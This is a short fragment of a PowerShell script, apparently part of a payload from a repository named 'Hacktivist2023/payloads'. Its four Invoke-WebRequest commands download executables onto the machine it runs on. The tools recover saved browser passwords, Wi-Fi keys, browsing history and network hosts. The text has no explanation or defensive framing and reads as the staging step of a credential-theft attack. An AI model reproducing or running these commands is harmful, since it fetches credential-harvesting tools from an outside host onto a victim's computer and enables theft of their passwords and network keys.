...
Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support/tools/BrowsingHistoryView.exe?raw=true  -OutFile BrowsingHistoryView.exe
Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support/tools/WNetWatcher.exe?raw=true  -OutFile WNetWatcher.exe
Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support/tools/WirelessKeyView.exe?raw=true  -OutFile WirelessKeyView.exe
Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support/tools/WebBrowserPassView.exe?raw=true  -OutFile WebBrowserPassView.exe 
